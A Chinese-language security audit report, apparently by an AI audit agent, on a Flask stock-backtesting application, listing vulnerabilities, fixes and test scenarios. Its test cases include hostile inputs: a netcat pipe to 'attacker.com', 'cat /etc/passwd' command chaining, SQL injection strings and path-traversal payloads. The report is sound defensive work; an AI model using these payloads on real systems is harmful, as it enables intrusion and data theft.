# 安全审查报告 - 股票回测系统

**审查日期**: 2026-02-16
**审查范围**: D:\ai_work\stock_test
**审查者**: Security Audit Agent
**系统类型**: Flask Web应用 + SQLite数据库 + 外部API调用

---

## 执行摘要

### 漏洞统计
- **Critical问题**: 3个
- **High问题**: 5个
- **Medium问题**: 4个
- **Low问题**: 3个
- **总计**: 15个安全问题

### 风险等级评估
**总体风险等级**: **HIGH (B级)**

**关键风险**:
1. 生产环境开启DEBUG模式（Critical）
2. 命令注入漏洞（Critical）
3. SQL注入潜在风险（High）
4. 路径遍历漏洞（High）
5. 无输入验证的JSON解析（High）

### 建议优先级
1. **立即修复**: Critical级别漏洞（1-3天内）
2. **尽快修复**: High级别漏洞（1周内）
3. **计划修复**: Medium级别漏洞（1个月内）
4. **长期改进**: Low级别漏洞（2-3个月内）

---

## 详细发现

### 1. 输入验证问题

#### 1.1 缺乏输入验证的JSON解析【HIGH】

**文件位置**:
- `app.py:40-41`
- `app_with_cache.py:68-69, 99-100, 254-255, 381-384, 495-496`

**漏洞描述**:
所有Flask路由直接使用`request.json`获取数据，没有进行任何验证或清理。攻击者可以提交恶意JSON载荷。

```python
# app_with_cache.py:68-69 (脆弱代码)
data = request.json
symbol = data.get('symbol')  # 没有验证symbol格式
```

**风险**:
- 提交超长字符串导致DoS
- 注入特殊字符导致SQL注入
- 提交恶意代码在前端执行（存储型XSS）

**修复建议**:
```python
# 建议的安全实现
import re

def validate_stock_symbol(symbol):
    """验证股票代码格式"""
    if not symbol or not isinstance(symbol, str):
        return False
    # A股代码：6位数字
    if not re.match(r'^[0-9]{6}$', symbol):
        return False
    if len(symbol) > 10:  # 额外长度限制
        return False
    return True

# 在路由中使用
@app.route('/api/cache/fetch', methods=['POST'])
def fetch_data():
    data = request.json or {}
    symbol = data.get('symbol', '').strip()

    if not validate_stock_symbol(symbol):
        return jsonify({'success': False, 'error': '股票代码格式无效'}), 400
    # 继续处理...
```

**影响范围**:
- `/api/cache/fetch` - 股票代码输入
- `/api/cache/update` - 股票代码输入
- `/api/cache/batch-fetch-sector` - 板块、日期、limit参数
- `/api/backtest/cache` - symbols数组、strategy参数
- `/api/parameters/update` - params字典

---

#### 1.2 股票代码生成存在注入风险【MEDIUM】

**文件位置**: `data_fetcher.py:19-33`

**漏洞描述**:
`generate_stock_codes`函数使用f-string格式化生成代码，如果prefix参数被污染可能导致问题。

```python
# data_fetcher.py:30-31
def generate_stock_codes(prefix: str, start: int, end: int) -> list:
    stocks.append(f"{prefix}{i:03d}")  # prefix未验证
```

**风险**:
虽然当前代码中prefix都是硬编码，但函数设计不安全。

**修复建议**:
```python
def generate_stock_codes(prefix: str, start: int, end: int) -> list:
    # 验证prefix只包含数字
    if not re.match(r'^[0-9]{0,3}$', prefix):
        raise ValueError(f"Invalid prefix: {prefix}")
    if not (1 <= start <= 999) or not (1 <= end <= 999):
        raise ValueError(f"Invalid range: {start}-{end}")
    # ... 继续处理
```

---

#### 1.3 日期参数未验证【MEDIUM】

**文件位置**: `app_with_cache.py:254-257`

**漏洞描述**:
日期参数直接从用户输入接收，未进行格式验证。

```python
# app_with_cache.py:256-257
start_date = data.get('start_date', START_DATE)
end_date = data.get('end_date', END_DATE)
# 直接使用，未验证格式
```

**修复建议**:
```python
import datetime

def validate_date(date_str):
    """验证日期格式 YYYYMMDD"""
    if not re.match(r'^\d{8}$', date_str):
        return False
    try:
        datetime.datetime.strptime(date_str, '%Y%m%d')
        return True
    except ValueError:
        return False

# 在路由中验证
if not validate_date(start_date) or not validate_date(end_date):
    return jsonify({'error': '日期格式无效'}), 400
```

---

### 2. SQL注入风险

#### 2.1 SQL查询使用f-string拼接【HIGH】

**文件位置**: `data_manager.py:85-89`

**漏洞描述**:
虽然使用了参数化查询（`params=(...)`），但查询字符串使用f-string构造，存在潜在风险。

```python
# data_manager.py:85-89 (当前实现)
query = f'''
    SELECT * FROM stock_data
    WHERE symbol = ? AND date >= ? AND date <= ?
    ORDER BY date
'''
df = pd.read_sql_query(query, conn, params=(symbol, start_date, end_date))
```

**风险评估**:
当前代码**相对安全**（使用了参数化占位符`?`），但代码模式容易被错误复制导致漏洞。

**修复建议**:
使用常量查询字符串，避免f-string：

```python
# 推荐实现
QUERY_GET_STOCK_DATA = '''
    SELECT * FROM stock_data
    WHERE symbol = ? AND date >= ? AND date <= ?
    ORDER BY date
'''
df = pd.read_sql_query(QUERY_GET_STOCK_DATA, conn, params=(symbol, start_date, end_date))
```

---

#### 2.2 动态SQL构造存在风险【MEDIUM】

**文件位置**: `data_manager.py:151-155`

**漏洞描述**:
INSERT语句使用cursor.execute，但列名是硬编码的。如果未来需要动态列，可能引入SQL注入。

```python
# data_manager.py:151-155
cursor.execute('''
    INSERT OR IGNORE INTO stock_data
    (symbol, date, open, close, high, low, volume, amount, amplitude, pct_change, change, turnover_rate)
    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
''', tuple(row))
```

**当前状态**: 安全（所有值都参数化）

**建议**: 添加代码注释标注安全实践，防止未来修改时引入漏洞。

---

### 3. 命令注入漏洞

#### 3.1 subprocess.run使用shell=True【CRITICAL】

**文件位置**: `run_commands.py:29`

**漏洞描述**:
使用`shell=True`执行命令，且命令来自硬编码的字典，但用户可以通过命令行参数控制command变量。

```python
# run_commands.py:29 (脆弱代码)
result = subprocess.run(cmd, shell=True, text=True)
```

**当前攻击向量**:
```python
# run_commands.py:48
command = sys.argv[1].lower()  # 用户输入
commands = {
    'test': ('python test_backtest_selection.py', '...'),
    'app': ('python app_with_cache.py', '...'),
    # ...
}
```

**风险评估**:
- **当前**: 中等风险（命令白名单化，但shell=True不必要）
- **未来**: 如果开发者扩展功能允许自定义命令，将变为Critical

**修复建议**:

```python
# 方案1: 移除shell=True（推荐）
result = subprocess.run(cmd.split(), shell=False, text=True, cwd=PROJECT_ROOT)

# 方案2: 如果必须使用shell，使用shlex转义
import shlex
safe_cmd = shlex.quote(cmd)
result = subprocess.run(safe_cmd, shell=True, text=True)

# 方案3: 使用白名单验证
ALLOWED_COMMANDS = ['test', 'app', 'check', 'status', 'help']
if command not in ALLOWED_COMMANDS:
    raise ValueError(f"Command not allowed: {command}")
```

---

### 4. 文件操作安全

#### 4.1 路径遍历漏洞【HIGH】

**文件位置**:
- `export_to_excel.py:103-104`
- `app.py:103-104`

**漏洞描述**:
导出Excel时，文件名直接使用用户提供的股票代码，未对路径进行验证。

```python
# export_to_excel.py:103-104 (脆弱代码)
output_file = f'回测__{stock_code}.xlsx'
export_detailed_trades_to_excel(stock_code, df, output_file)
# 如果stock_code = "../../etc/passwd"，将导致路径遍历
```

```python
# app.py:103-107 (脆弱代码)
output_file = f'回测__{stock_code}.xlsx'
export_detailed_trades_to_excel(stock_code, df, output_file)
return send_file(output_file, as_attachment=True)
# 未验证文件是否存在于预期目录
```

**攻击场景**:
```bash
POST /api/backtest/export
{"stock_code": "../../../etc/passwd"}
# 可能读取系统文件
```

**修复建议**:

```python
import os
from pathlib import Path

def safe_filename(stock_code, extension='.xlsx'):
    """生成安全的文件名"""
    # 白名单验证
    if not re.match(r'^[0-9]{6}$', stock_code):
        raise ValueError("Invalid stock code")

    # 确保在安全目录内
    safe_dir = Path('./exports').resolve()
    safe_dir.mkdir(exist_ok=True)

    filename = f'回测_{stock_code}{extension}'
    filepath = (safe_dir / filename).resolve()

    # 验证解析后的路径仍在安全目录内
    if not str(filepath).startswith(str(safe_dir)):
        raise ValueError("Path traversal detected")

    return str(filepath)

# 使用
output_file = safe_filename(stock_code)
export_detailed_trades_to_excel(stock_code, df, output_file)
```

---

#### 4.2 临时文件未清理【LOW】

**文件位置**: `export_to_excel.py:210-211`

**漏洞描述**:
生成的Excel文件保存在当前目录，未自动清理。长期运行会导致磁盘空间耗尽。

**修复建议**:
```python
import tempfile
import atexit
import os

# 使用临时目录
TEMP_EXPORT_DIR = Path(tempfile.gettempdir()) / 'stock_backtest_exports'
TEMP_EXPORT_DIR.mkdir(exist_ok=True)

# 注册清理函数
def cleanup_old_exports():
    """清理超过24小时的导出文件"""
    import time
    now = time.time()
    for f in TEMP_EXPORT_DIR.glob('*.xlsx'):
        if now - f.stat().st_mtime > 86400:  # 24小时
            f.unlink()

atexit.register(cleanup_old_exports)
```

---

#### 4.3 配置文件权限未检查【MEDIUM】

**文件位置**:
- `config_manager.py:45-46` (strategy_config.json)
- `config_manager.py:195-196` (strategy_presets.json)

**漏洞描述**:
JSON配置文件写入时未检查权限，可能被其他进程或用户读取。

```python
# config_manager.py:45-46
with open(self.config_file, 'w', encoding='utf-8') as f:
    json.dump(config_data, f, ensure_ascii=False, indent=2)
# 未设置文件权限
```

**修复建议**:
```python
import stat

def safe_write_json(filepath, data):
    """安全写入JSON文件"""
    with open(filepath, 'w', encoding='utf-8') as f:
        json.dump(data, f, ensure_ascii=False, indent=2)

    # 设置权限：仅所有者可读写 (0600)
    os.chmod(filepath, stat.S_IRUSR | stat.S_IWUSR)
```

---

### 5. API和网络安全

#### 5.1 生产环境开启DEBUG模式【CRITICAL】

**文件位置**:
- `app.py:131`
- `app_with_cache.py:638`

**漏洞描述**:
Flask应用在生产环境使用`debug=True`，会暴露敏感信息和交互式调试器。

```python
# app_with_cache.py:638 (严重安全漏洞)
if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
```

**风险**:
1. **交互式调试器**: 攻击者可以在浏览器中执行任意Python代码
2. **详细错误信息**: 泄露代码路径、依赖版本、内部逻辑
3. **自动重载**: 可能导致文件监视漏洞
4. **性能下降**: 生产环境性能严重降低

**攻击演示**:
```bash
# 访问任何导致错误的URL
curl http://target:5000/api/backtest/cache -d '{"symbols": null}'

# Flask会返回完整的traceback和Werkzeug调试器
# 调试器允许在浏览器中执行任意Python代码
```

**修复建议**:

```python
# 推荐实现
import os

if __name__ == '__main__':
    # 从环境变量读取配置
    debug_mode = os.environ.get('FLASK_DEBUG', 'False').lower() == 'true'
    host = os.environ.get('FLASK_HOST', '127.0.0.1')  # 默认只监听本地
    port = int(os.environ.get('FLASK_PORT', '5000'))

    if debug_mode:
        print("⚠️  WARNING: Running in DEBUG mode!")

    app.run(debug=debug_mode, host=host, port=port)

# 生产部署使用WSGI服务器
# gunicorn -w 4 -b 0.0.0.0:5000 app_with_cache:app
```

---

#### 5.2 CORS配置过于宽松【HIGH】

**文件位置**: `app.py:16`, `app_with_cache.py:20`

**漏洞描述**:
使用`CORS(app)`启用所有域的跨域访问，允许任何网站调用API。

```python
# app_with_cache.py:20
CORS(app)  # 允许所有来源
```

**风险**:
- 任意第三方网站可以调用API
- CSRF攻击风险
- 数据泄露

**修复建议**:

```python
from flask_cors import CORS

# 方案1: 限制允许的域名
CORS(app, resources={
    r"/api/*": {
        "origins": ["https://yourdomain.com", "https://app.yourdomain.com"],
        "methods": ["GET", "POST"],
        "allow_headers": ["Content-Type"]
    }
})

# 方案2: 使用环境变量配置
allowed_origins = os.environ.get('ALLOWED_ORIGINS', '').split(',')
CORS(app, origins=allowed_origins)

# 方案3: 完全禁用CORS（如果只是内部使用）
# 移除 CORS(app)
```

---

#### 5.3 缺少速率限制【MEDIUM】

**文件位置**: 所有API路由

**漏洞描述**:
所有API端点没有速率限制，容易被滥用导致DoS。

**风险**:
- 暴力破解（如果添加认证）
- 资源耗尽（大量请求导致数据库过载）
- API滥用（批量爬取数据）

**修复建议**:

```python
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

# 初始化限流器
limiter = Limiter(
    app=app,
    key_func=get_remote_address,
    default_limits=["200 per day", "50 per hour"],
    storage_uri="memory://"  # 生产环境使用Redis
)

# 为敏感端点设置更严格的限制
@app.route('/api/cache/batch-fetch-sector', methods=['POST'])
@limiter.limit("5 per hour")  # 批量获取限制更严
def batch_fetch_sector_data():
    # ...

@app.route('/api/backtest/cache', methods=['POST'])
@limiter.limit("20 per minute")
def run_backtest_with_cache():
    # ...
```

---

#### 5.4 外部API调用无超时限制【LOW】

**文件位置**: `data_fetcher.py:106`, `data_fetcher_efinance.py:27-31`

**漏洞描述**:
调用efinance/akshare API时没有设置超时，可能导致请求挂起。

```python
# data_fetcher.py:106 (无超时)
df = ef.stock.get_quote_history(symbol, beg=start_date, end=end_date)
```

**修复建议**:

```python
import requests
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry

# 配置重试和超时
session = requests.Session()
retry = Retry(total=3, backoff_factor=0.5)
adapter = HTTPAdapter(max_retries=retry)
session.mount('http://', adapter)
session.mount('https://', adapter)

# 在API调用中使用
try:
    response = session.get(url, timeout=10)  # 10秒超时
except requests.Timeout:
    print("API request timed out")
```

---

### 6. 数据处理安全

#### 6.1 敏感错误信息泄露【HIGH】

**文件位置**:
- `app_with_cache.py:90, 110, 459`
- `app.py:90`

**漏洞描述**:
API错误响应直接返回异常信息，可能泄露内部实现细节。

```python
# app_with_cache.py:90-93 (泄露敏感信息)
except Exception as e:
    return jsonify({'success': False, 'error': str(e)}), 400
# str(e)可能包含文件路径、SQL语句等
```

**风险**:
```python
# 示例：异常信息可能泄露
{
  "error": "sqlite3.OperationalError: no such table: stock_data at line 85 in /app/data_manager.py"
}
# 暴露了数据库类型、表结构、文件路径
```

**修复建议**:

```python
import logging

# 配置日志
logging.basicConfig(
    filename='app_errors.log',
    level=logging.ERROR,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)

# 在路由中使用
@app.route('/api/cache/fetch', methods=['POST'])
def fetch_data():
    try:
        # ... 处理逻辑
    except ValueError as e:
        # 用户输入错误：返回友好信息
        return jsonify({'success': False, 'error': '输入参数无效'}), 400
    except Exception as e:
        # 系统错误：记录详细日志，返回通用信息
        logging.error(f"Fetch data error: {str(e)}", exc_info=True)
        return jsonify({
            'success': False,
            'error': '系统错误，请稍后重试',
            'error_id': generate_error_id()  # 错误追踪ID
        }), 500
```

---

#### 6.2 traceback.print_exc()泄露信息【MEDIUM】

**文件位置**:
- `app_with_cache.py:459`
- `demo_test_debug.py:142`

**漏洞描述**:
使用`traceback.print_exc()`直接打印到标准输出，在生产环境可能被日志收集工具捕获并暴露。

```python
# app_with_cache.py:458-460
except Exception as e:
    import traceback
    traceback.print_exc()  # 打印到stdout
    return jsonify({'success': False, 'error': str(e)}), 400
```

**修复建议**:

```python
import logging

try:
    # ...
except Exception as e:
    # 使用logging模块记录，而不是print
    logging.exception("Backtest error occurred")
    return jsonify({'success': False, 'error': '回测失败'}), 500
```

---

#### 6.3 pickle模块导入但未使用【LOW】

**文件位置**: `data_manager.py:7`

**漏洞描述**:
导入了`pickle`模块但未使用。pickle可以执行任意代码，应避免使用。

```python
# data_manager.py:7
import pickle  # 未使用
```

**风险**:
如果未来有人使用pickle反序列化用户数据，会引入远程代码执行漏洞。

**修复建议**:
```python
# 移除未使用的导入
# import pickle  # 删除此行

# 如果需要序列化，使用安全的替代方案
import json  # 使用JSON而非pickle
```

---

#### 6.4 数据库文件权限未检查【MEDIUM】

**文件位置**: `data_manager.py:30`

**漏洞描述**:
SQLite数据库文件创建时未设置权限，可能被其他用户访问。

```python
# data_manager.py:30
conn = sqlite3.connect(self.db_file)
# 文件权限取决于系统umask，可能是644（所有人可读）
```

**修复建议**:

```python
import stat

def create_secure_db(db_file):
    """创建具有安全权限的数据库"""
    # 确保父目录存在
    db_file.parent.mkdir(mode=0o700, exist_ok=True)

    # 创建数据库
    conn = sqlite3.connect(db_file)

    # 设置文件权限为600（仅所有者可读写）
    os.chmod(db_file, stat.S_IRUSR | stat.S_IWUSR)

    return conn
```

---

### 7. 认证和授权

#### 7.1 完全缺失认证机制【CRITICAL】

**文件位置**: 所有API端点

**漏洞描述**:
系统没有任何认证机制，所有API端点完全开放。

**风险**:
- 任何人可以访问所有功能
- 数据泄露
- 资源滥用
- 恶意数据注入

**修复建议**:

```python
from functools import wraps
from flask import request, jsonify
import secrets

# 简单的API Key认证
API_KEYS = set(os.environ.get('API_KEYS', '').split(','))

def require_api_key(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        api_key = request.headers.get('X-API-Key')
        if not api_key or api_key not in API_KEYS:
            return jsonify({'error': 'Invalid or missing API key'}), 401
        return f(*args, **kwargs)
    return decorated_function

# 应用到路由
@app.route('/api/backtest/cache', methods=['POST'])
@require_api_key
def run_backtest_with_cache():
    # ...

# 更安全的方案：使用Flask-HTTPAuth
from flask_httpauth import HTTPBasicAuth
auth = HTTPBasicAuth()

@auth.verify_password
def verify_password(username, password):
    # 从数据库或环境变量验证
    return check_credentials(username, password)

@app.route('/api/backtest/cache', methods=['POST'])
@auth.login_required
def run_backtest_with_cache():
    # ...
```

---

## OWASP Top 10 (2021) 检查清单

| OWASP分类 | 状态 | 发现的问题 | 风险等级 |
|-----------|------|-----------|---------|
| **A01:2021 – Broken Access Control** | ❌ 不符合 | 完全缺失认证和授权 | Critical |
| **A02:2021 – Cryptographic Failures** | ⚠️ 部分符合 | 配置文件无加密，数据库文件权限不当 | Medium |
| **A03:2021 – Injection** | ❌ 不符合 | 命令注入、潜在SQL注入风险 | High |
| **A04:2021 – Insecure Design** | ⚠️ 部分符合 | 无速率限制、无认证 | High |
| **A05:2021 – Security Misconfiguration** | ❌ 不符合 | DEBUG模式开启、CORS过度宽松 | Critical |
| **A06:2021 – Vulnerable Components** | ✅ 符合 | 无已知漏洞的依赖（需定期扫描） | - |
| **A07:2021 – Identification/Authentication Failures** | ❌ 不符合 | 完全无认证 | Critical |
| **A08:2021 – Software and Data Integrity Failures** | ⚠️ 部分符合 | pickle导入（未使用） | Low |
| **A09:2021 – Security Logging & Monitoring Failures** | ❌ 不符合 | 无结构化日志、无监控 | Medium |
| **A10:2021 – Server-Side Request Forgery (SSRF)** | ✅ 符合 | 外部API调用受限于白名单域名 | - |

**合规评分**: 2/10 ✅, 4/10 ⚠️, 4/10 ❌
**总体评级**: **不合规 (Non-Compliant)**

---

## 立即修复建议（按优先级排序）

### Priority 1: Critical（立即修复 - 1-3天）

#### 修复1: 禁用DEBUG模式
```python
# app.py, app_with_cache.py
if __name__ == '__main__':
    # 永远不要在生产环境使用debug=True
    app.run(debug=False, host='127.0.0.1', port=5000)

# 使用环境变量控制
DEBUG = os.environ.get('FLASK_DEBUG', 'False').lower() == 'true'
if DEBUG:
    print("⚠️  WARNING: DEBUG mode is enabled!")
app.run(debug=DEBUG, ...)
```

#### 修复2: 添加基本认证
```python
# 创建 auth.py
from functools import wraps
from flask import request, jsonify
import os

API_KEY = os.environ.get('API_KEY', 'changeme')

def require_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        auth_header = request.headers.get('Authorization')
        if not auth_header or auth_header != f'Bearer {API_KEY}':
            return jsonify({'error': 'Unauthorized'}), 401
        return f(*args, **kwargs)
    return decorated

# 应用到所有敏感路由
@app.route('/api/cache/fetch', methods=['POST'])
@require_auth
def fetch_data():
    # ...
```

#### 修复3: 修复命令注入
```python
# run_commands.py
# 移除shell=True
result = subprocess.run(
    cmd.split(),  # 分割命令
    shell=False,  # 禁用shell
    cwd=PROJECT_ROOT,
    text=True
)
```

---

### Priority 2: High（尽快修复 - 1周内）

#### 修复4: 输入验证框架
```python
# 创建 validators.py
import re
from typing import Any, Tuple

def validate_stock_code(code: str) -> Tuple[bool, str]:
    """验证股票代码"""
    if not code or not isinstance(code, str):
        return False, "股票代码不能为空"
    if not re.match(r'^[0-9]{6}$', code):
        return False, "股票代码必须是6位数字"
    return True, ""

def validate_date(date_str: str) -> Tuple[bool, str]:
    """验证日期格式"""
    if not re.match(r'^\d{8}$', date_str):
        return False, "日期格式必须是YYYYMMDD"
    try:
        datetime.strptime(date_str, '%Y%m%d')
        return True, ""
    except ValueError:
        return False, "日期无效"

def validate_limit(limit: Any) -> Tuple[bool, str]:
    """验证限制数量"""
    if not isinstance(limit, int):
        return False, "limit必须是整数"
    if limit < 1 or limit > 1000:
        return False, "limit必须在1-1000之间"
    return True, ""

# 在路由中使用
@app.route('/api/cache/fetch', methods=['POST'])
def fetch_data():
    data = request.json or {}
    symbol = data.get('symbol', '')

    valid, error_msg = validate_stock_code(symbol)
    if not valid:
        return jsonify({'success': False, 'error': error_msg}), 400

    # 继续处理...
```

#### 修复5: 路径遍历防护
```python
# 创建 file_utils.py
from pathlib import Path
import os

SAFE_EXPORT_DIR = Path('./exports').resolve()
SAFE_EXPORT_DIR.mkdir(exist_ok=True)

def get_safe_export_path(stock_code: str, extension: str = '.xlsx') -> Path:
    """生成安全的导出文件路径"""
    # 验证stock_code
    if not re.match(r'^[0-9]{6}$', stock_code):
        raise ValueError("Invalid stock code")

    # 生成文件名
    filename = f"backtest_{stock_code}_{int(time.time())}{extension}"
    filepath = (SAFE_EXPORT_DIR / filename).resolve()

    # 确保路径在安全目录内
    if not str(filepath).startswith(str(SAFE_EXPORT_DIR)):
        raise ValueError("Path traversal attempt detected")

    return filepath
```

#### 修复6: CORS配置优化
```python
# app_with_cache.py
from flask_cors import CORS

# 生产环境配置
ALLOWED_ORIGINS = os.environ.get('ALLOWED_ORIGINS', 'http://localhost:3000').split(',')

CORS(app, resources={
    r"/api/*": {
        "origins": ALLOWED_ORIGINS,
        "methods": ["GET", "POST"],
        "allow_headers": ["Content-Type", "Authorization"],
        "max_age": 3600
    }
})
```

---

### Priority 3: Medium（计划修复 - 1个月内）

#### 修复7: 添加速率限制
```bash
pip install Flask-Limiter redis
```

```python
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

limiter = Limiter(
    app=app,
    key_func=get_remote_address,
    default_limits=["100 per hour"],
    storage_uri="redis://localhost:6379"
)

@app.route('/api/cache/batch-fetch-sector', methods=['POST'])
@limiter.limit("5 per hour")
def batch_fetch_sector_data():
    # ...
```

#### 修复8: 结构化日志
```python
import logging
from logging.handlers import RotatingFileHandler

# 配置日志
handler = RotatingFileHandler('app.log', maxBytes=10000000, backupCount=5)
handler.setFormatter(logging.Formatter(
    '[%(asctime)s] %(levelname)s in %(module)s: %(message)s'
))
app.logger.addHandler(handler)
app.logger.setLevel(logging.INFO)

# 记录安全事件
@app.before_request
def log_request():
    app.logger.info(f"Request: {request.method} {request.path} from {request.remote_addr}")
```

#### 修复9: 安全HTTP头
```python
from flask_talisman import Talisman

# 添加安全头
Talisman(app,
    force_https=False,  # 生产环境设为True
    strict_transport_security=True,
    content_security_policy={
        'default-src': "'self'",
        'script-src': "'self' 'unsafe-inline'",
        'style-src': "'self' 'unsafe-inline'"
    }
)
```

---

### Priority 4: Low（长期改进 - 2-3个月内）

#### 修复10: 依赖安全扫描
```bash
# 安装安全扫描工具
pip install safety bandit

# 扫描依赖漏洞
safety check

# 扫描代码安全问题
bandit -r . -f json -o security_report.json
```

#### 修复11: 添加单元测试
```python
# tests/test_security.py
def test_sql_injection():
    """测试SQL注入防护"""
    malicious_input = "000001'; DROP TABLE stock_data; --"
    response = client.post('/api/cache/fetch', json={'symbol': malicious_input})
    assert response.status_code == 400
    assert 'error' in response.json

def test_path_traversal():
    """测试路径遍历防护"""
    response = client.post('/api/backtest/export', json={'stock_code': '../../../etc/passwd'})
    assert response.status_code == 400
```

---

## 安全测试场景（提供给test-engineer）

### 测试场景1: SQL注入测试

**目标**: 验证所有数据库查询都使用参数化查询

**测试用例**:
```python
# 测试1: 股票代码SQL注入
POST /api/cache/fetch
{
  "symbol": "000001' OR '1'='1"
}
# 预期: 400错误或忽略

# 测试2: 日期参数注入
POST /api/cache/batch-fetch-sector
{
  "sector": "中证500",
  "start_date": "20240101'; DROP TABLE stock_data; --",
  "end_date": "20250213"
}
# 预期: 400错误
```

---

### 测试场景2: 命令注入测试

**目标**: 验证subprocess调用安全

**测试用例**:
```bash
# 测试1: 命令链接
python run_commands.py "test && cat /etc/passwd"
# 预期: 命令不执行或报错

# 测试2: 管道注入
python run_commands.py "test | nc attacker.com 4444"
# 预期: 命令不执行或报错
```

---

### 测试场景3: 路径遍历测试

**目标**: 验证文件操作限制在安全目录

**测试用例**:
```python
# 测试1: 上层目录遍历
POST /api/backtest/export
{
  "stock_code": "../../etc/passwd"
}
# 预期: 400错误或文件不存在

# 测试2: 绝对路径
POST /api/backtest/export
{
  "stock_code": "/etc/passwd"
}
# 预期: 400错误
```

---

### 测试场景4: DoS攻击测试

**目标**: 验证速率限制和资源保护

**测试用例**:
```python
# 测试1: 批量请求DoS
for i in range(1000):
    POST /api/cache/fetch {"symbol": f"{i:06d}"}
# 预期: 被速率限制阻止

# 测试2: 超大数据集请求
POST /api/cache/batch-fetch-sector
{
  "sector": "沪深A股",
  "limit": 999999999
}
# 预期: 参数验证拒绝
```

---

### 测试场景5: 认证绕过测试

**目标**: 验证所有敏感端点都需要认证

**测试用例**:
```python
# 测试1: 无认证访问
POST /api/backtest/cache
# 预期: 401 Unauthorized

# 测试2: 错误的认证凭证
POST /api/backtest/cache
Headers: {"Authorization": "Bearer invalid_token"}
# 预期: 401 Unauthorized
```

---

## 合规性建议

### GDPR / 数据隐私
- [ ] 添加数据保留策略（自动删除旧数据）
- [ ] 实现数据导出功能（用户权利）
- [ ] 记录数据访问日志

### PCI-DSS（如果处理支付）
- [ ] 不在日志中记录敏感数据
- [ ] 加密存储敏感配置
- [ ] 实施最小权限原则

### SOC 2 Type II
- [ ] 实施访问控制
- [ ] 启用审计日志
- [ ] 定期安全审查

---

## 安全工具推荐

### 静态分析工具
```bash
# 安全漏洞扫描
pip install bandit
bandit -r . -ll

# 依赖漏洞检查
pip install safety
safety check --full-report

# 代码质量检查
pip install pylint
pylint app_with_cache.py
```

### 动态分析工具
```bash
# OWASP ZAP - Web应用安全扫描
docker run -t owasp/zap2docker-stable zap-baseline.py -t http://localhost:5000

# SQLMap - SQL注入测试
sqlmap -u "http://localhost:5000/api/cache/fetch" --data='{"symbol":"000001"}' --method=POST --headers="Content-Type: application/json"
```

### 监控工具
```bash
# Sentry - 错误追踪
pip install sentry-sdk[flask]

# Prometheus - 性能监控
pip install prometheus-flask-exporter
```

---

## 总结

### 最严重的3个问题
1. **DEBUG模式开启** - 允许远程代码执行
2. **完全无认证** - 任何人可以访问所有功能
3. **命令注入漏洞** - 可能执行任意系统命令

### 建议的修复路线图

**第1周**:
- 禁用DEBUG模式
- 添加基本认证
- 修复命令注入

**第2-4周**:
- 实施输入验证框架
- 修复路径遍历漏洞
- 优化CORS配置

**第2个月**:
- 添加速率限制
- 实施结构化日志
- 添加安全HTTP头

**第3个月**:
- 完善监控和告警
- 实施自动化安全测试
- 定期依赖更新流程

### 联系信息
如有疑问，请联系安全团队进行澄清和协助。

---

**报告版本**: 1.0
**下次审查日期**: 2026-05-16
**审查周期**: 季度（每3个月）
